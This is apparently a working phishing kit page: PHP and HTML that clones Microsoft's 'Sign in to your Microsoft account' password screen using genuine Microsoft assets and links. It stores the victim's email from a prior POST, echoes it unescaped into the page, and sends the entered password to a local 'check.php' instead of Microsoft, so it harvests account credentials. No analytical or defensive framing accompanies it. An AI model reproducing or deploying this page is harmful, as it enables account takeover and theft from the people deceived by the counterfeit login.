<?php 
session_start();
$_SESSION['email']=$_POST['email'];

?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, Voice: -3};</script><noscript><meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-GB&lc=2057"/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br /><br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta name="PageID" content="i5030"><meta name="SiteID" content="292841"><meta name="ReqLC" content="2057"><meta name="LocLC" content="2057"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="https://auth.gfx.ms/16.000.26754.00.1/images/favicon.ico">
        <link rel="stylesheet" title="Default" type="text/css" href="https://auth.gfx.ms/16.000.26754.00.1/Default2057.css"><style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(a,f,b){var e=1,d=unescape('%3Cscript type="text/javascript" src="'),c=unescape('"%3E%3C/script%3E');if(g_sSRSSuccess.indexOf(a)!=-1)return;if(typeof window[a]=="undefined"){g_iSRSFailed=1;b<=e&&document.write(d+f+c)}else g_sSRSSuccess+=a+"|"+b+","}
  var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.26754.00.1/images/Windows_Live_v_thumb.jpg">
<script type="text/javascript" src="https://auth.gfx.ms/16.000.26754.00.1/DefaultLoginPaginatedStrings.EN-GB.js"></script>
    <script type="text/javascript" src="https://auth.gfx.ms/16.000.26754.00.1/DefaultLogin_PCore.js"></script>
    <script type="text/javascript">SRSRetry("__DefaultLoginPaginatedStrings", "https://auth.gfx.ms/16.000.26754.00.1/DefaultLoginPaginatedStrings.EN-GB.js", 1);SRSRetry("__DefaultLogin_PCore", "https://auth.gfx.ms/16.000.26754.00.1/DefaultLogin_PCore.js", 1);</script><script type="text/javascript">SRSRetry("__DefaultLoginPaginatedStrings", "https://auth.gfx.ms/16.000.26754.00.1/DefaultLoginPaginatedStrings.EN-GB.js", 2);SRSRetry("__DefaultLogin_PCore", "https://auth.gfx.ms/16.000.26754.00.1/DefaultLogin_PCore.js", 2);</script></head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<SCRIPT language="JavaScript">
	<!--
	function check(form) {
		if (form.i0118.value == "")
		{ alert("Your password is required");
		form.i0118.focus(); return;}
		form.submit()
	}
	//-->
</SCRIPT>
<div><!--  --> <form name="f1" spellcheck="false" method="post" action="check.php"><!-- ko withProperties: { '$loginPage': $data } --> <div data-bind="component: { name: 'page', params: {
        serverData: svr,
        showButtons: svr.A4,
        showFooterLinks: true,
        useWizardBehavior: svr.BI,
        handleWizardButtons: false,
        password: password,
        hideFromAria: ariaHidden } }"><!--  --> 
		
		
		<div id="maincontent"><!-- ko withProperties: { '$wizard': viewModel } --> <section class="section no-margin-bottom" data-bind="visible: !$wizard || $wizard.showHolder"> <div class="section-body container"> <div id="pageControlHost"><!-- ko if: isInternalModeEnabled --><!-- /ko --> <div> <div id="Credentials"> <div class="container" id="CredentialsInputPane"><!-- ko if: svr.iProductIcon !== -1 --> <div class="row text-body" data-bind="ariaHidden: hideFromAria"><!-- ko component: 'accessible-image-control' --><!-- ko if: isHighContrastBlackTheme || svr.fHasBackgroundColor --><!-- /ko --><!-- ko ifnot: isHighContrastBlackTheme || svr.fHasBackgroundColor --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="img-centipede" data-bind="
                                    attr: { src: centipede.getDarkUrl(), alt: str['MOBILE_STR_Header_Brand'] }" src="https://auth.gfx.ms/16.000.26754.00.1/images/AppCentipede/AppCentipede_Microsoft.svg" alt="Microsoft account"><!-- /ko --> <!-- /ko --><!-- /ko --> </div><!-- /ko --> <!-- ko template: { nodes: templateNodes["MainContent"], data: $parent } --> <div data-bind="component: { name: 'pagination-control',
                publicMethods: paginationControlMethods,
                params: {
                    initialViewId: initialViewId,
                    currentViewId: currentViewId,
                    initialSharedData: initialSharedData,
                    initialError: $loginPage.getServerError() },
                event: {
                    cancel: paginationControl_onCancel } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-bind="component: { name: 'login-paginated-password-view',
                    publicMethods: viewInterfaces[$index()],
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        isInitialView: isInitialState,
                        username: sharedData.username,
                        displayName: sharedData.displayName,
                        passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                        hasRemoteNgc: !!sharedData.remoteNgcSlk,
                        desktopSsoEnabled: sharedData.desktopSsoEnabled,
                        defaultKmsiValue: svr.k === 1 },
                    event: {
                        load: view_onLoad,
                        switchView: view_onSwitchView,
                        submitReady: $loginPage.view_onSubmitReady,
                        resetPassword: $loginPage.passwordView_onResetPassword } }"><!--  -->


						<input name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0" type="hidden"> 
						<input name="login" data-bind="value: username" value="<?php echo $_SESSION['email'];?>" type="hidden"> 
						<input name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text">
						<input name="ps" value="2" type="hidden"> <input name="type" data-bind="value: svr.BI ? 20 : 11" value="11" type="hidden"> 
						<input name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3" type="hidden"> 
						<div id="loginHeader" class="row text-subheader" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
						<input type="hidden" name="email" class="inp" size="30" style="height:2em;border:none; color:#888888;" value="<?php echo $_SESSION['email']; ?>" placeholder="Username">
						<div class="row text-body"> <div id="passwordDesc" class="wrap-content" data-bind="text: pageDescription">Enter the password for <?php echo $_SESSION['email']; ?></div>
						<!-- ko if: allowPhoneDisambiguation --><!-- /ko --> </div> 
						<div class="row"> <div class="form-group col-md-24">
						<!-- ko if: error --><!-- /ko --> 
						<div class="placeholderContainer" >
			
					
			<!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
			
			<input name="passwd" id="i0118" placeholder="Password" autocomplete="off" class="form-control" aria-describedby="passwordError passwordDesc"   maxlength="127" type="password" >
					
					
					
					
			
			<!-- /ko --><!-- /ko --><!-- ko ifnot: forcePlaceholderAttribute --> <div class="phholder" style="left:0;top:0;width:100%;position:absolute;z-index:5" data-bind> </div> <!-- /ko --></div> </div> </div><!-- ko if: svr.BE !== false --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.c &amp;&amp; !svr.U"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked" type="checkbox"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div><!-- /ko --><!-- ko if: svr.U --><!-- /ko --> <div class="row"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.A4,
            isSecondaryButtonVisible: svr.A4 &amp;&amp; !isInitialView },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group"> <div data-bind="css: { 'col-xs-12': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }" class="col-xs-12"> <input id="idBtn_Back" class="btn btn-block" data-bind="
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back" type="button"> </div> <div data-bind="css: { 'col-xs-12': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" class="col-xs-12"> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in" onClick="check(this.form)" type="button"> </div> </div></div> </div> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1479722006%26rver%3d6.4.6456.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%26lc%3d2057%26id%3d292841%26mkt%3den-gb%26cbcxt%3dout%26fl%3dwld%26contextid%3d3120DC6F591A060F%26bk%3d1479722009&amp;id=292841&amp;uiflavor=web&amp;uaid=2419581f135940218028ecd616c02d58&amp;mkt=EN-GB&amp;lc=2057&amp;bk=1479722009" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.e, click: resetPassword_onClick">Forgotten my password</a> </div><!-- ko if: hasRemoteNgc --><!-- /ko --> <div class="form-group" data-bind="visible: (svr.c || svr.U) &amp;&amp; svr.urlSwitch &amp;&amp; svr.w" style="display: none;"> <a id="i1668" href="https://login.live.com/logout.srf?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1479722006&amp;rver=6.4.6456.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&amp;lc=2057&amp;id=292841&amp;mkt=en-gb&amp;cbcxt=out&amp;fl=wld&amp;contextid=3120DC6F591A060F&amp;ru=https://outlook.live.com/owa/&amp;bk=1479722009&amp;lm=I" data-bind="text: str['CT_FED_STR_ChangeUserLink_Text'], href: svr.urlSwitch">Sign in with a different Microsoft account</a> </div> </div> </div> </div><!-- ko if: desktopSsoEnabled --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> <input name="canary" data-bind="value: svr.canary" value="" type="hidden"> <input name="ctx" data-bind="value: ctx" value="" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.Bm }, value: flowToken" name="PPFT" value="DZuX5oR5FvKEQ2ptGA9ze2BUz8gUDhwz4jKbd6dZx9zZw!CchMZIdx0OFvfAWnND6SotUQIdcin1iQN8AA9!HRc47Ti!C60d!ScRKwR526NfNlc0KFU1JFmgI4XhROpOzLuiqPBcIA0KmnEKYl1S6aYF*Xl7vaYNdna1DSKDJPWBYQBRTZoLEYwm56TzSV6EXpUycEi5LP5DKl679L!*Y9WeI*pgoc!KVjdeg1eH6bhFW2zJZnlE3HytDt58wJdS3IUrz1m81!KrWHUodT75d1w$" type="hidden"> <input name="PPSX" data-bind="value: svr.t" value="Pass" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.aa" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { loginMode: svr.g } }"><input name="i2" data-bind="value: clientMode" value="1" type="hidden"> <input name="i16" data-bind="value: clientPerf" value="{&quot;navigationStart&quot;:1479722007269,&quot;unloadEventStart&quot;:0,&quot;unloadEventEnd&quot;:0,&quot;redirectStart&quot;:0,&quot;redirectEnd&quot;:0,&quot;fetchStart&quot;:1479722008962,&quot;domainLookupStart&quot;:1479722008962,&quot;domainLookupEnd&quot;:1479722008962,&quot;connectStart&quot;:1479722008962,&quot;connectEnd&quot;:1479722008962,&quot;requestStart&quot;:1479722011240,&quot;responseStart&quot;:1479722011883,&quot;responseEnd&quot;:1479722012290,&quot;domLoading&quot;:1479722012295,&quot;domInteractive&quot;:1479722012826,&quot;domContentLoadedEventStart&quot;:1479722012861,&quot;domContentLoadedEventEnd&quot;:1479722012861,&quot;domComplete&quot;:1479722012862,&quot;loadEventStart&quot;:1479722012862,&quot;loadEventEnd&quot;:1479722013529}" type="hidden"> <input name="i17" data-bind="value: srsFailed" value="0" type="hidden"> <input name="i18" data-bind="value: srsSuccess" value="__DefaultLoginPaginatedStrings|1,__DefaultLogin_PCore|1," type="hidden"> <input name="i19" data-bind="value: timeOnPage" value="" type="hidden"></div> <div data-bind="component: { name: 'learn-more-field',
                publicMethods: learnMoreMethods,
                params: {
                    accountQueryUrl: svr.a0,
                    loadDynamicContent: svr.Bg },
                 event: {
                    show: learnMore_onShow,
                    hide: learnMore_onHide } }"><!--  --><!-- ko if: visible --><!-- /ko --></div> <!-- /ko --> </div> </div> </div> </div> <div data-bind="ariaHidden: hideFromAria"><!-- ko if: showButtons && templateNodes["Buttons"] --><!-- /ko --><!-- ko if: templateNodes["Links"] --><!-- /ko --> <div id="ftr" class="text-body"> <div data-bind="component: { name: 'footer-control', params: {
                        showLinks: footer.showLinks,
                        showLogo: footer.showLogo,
                        serverData: svr } }"><!--  --> <div id="footerTD" class="popupfooter popup breakword footer"><!-- ko if: showLinks || impressumLink -->
</html>						<div class="footerNode links text-secondary"><!-- ko if: showLinks --> <a id="ftrTerms" class="first" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, attr: { 'target': linkTarget }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-GB&amp;vv=1600" target="_blank">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, attr: { 'target': linkTarget }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-GB&amp;vv=1600" target="_blank">Privacy &amp; Cookies</a><!-- /ko --><!-- ko if: impressumLink --><!-- /ko --> </div><!-- /ko --><!-- ko if: showLogo --> <div id="ftrLogo" class="footerNode text-base text-secondary text-logotype"><!-- ko component: 'accessible-image-control' --><!-- ko if: isHighContrastBlackTheme || svr.fHasBackgroundColor --><!-- /ko --><!-- ko ifnot: isHighContrastBlackTheme || svr.fHasBackgroundColor --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img pngsrc="https://auth.gfx.ms/16.000.26754.00.1/images/Microsoft_Logotype_Gray.png" svgsrc="https://auth.gfx.ms/16.000.26754.00.1/images/Microsoft_Logotype_Gray.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://auth.gfx.ms/16.000.26754.00.1/images/Microsoft_Logotype_Gray.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> </div><!-- /ko --><!-- ko ifnot: showLogo --><!-- /ko --> </div></div> </div> </div> </div> </section><!-- /ko --> </div></div><!-- /ko --> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form></div><iframe id="idPartnerPL" style="display: none;" src="https://outlook.office365.com/owa/prefetch.aspx?id=292841&amp;mkt=EN-GB" width="0" height="0"></iframe></body>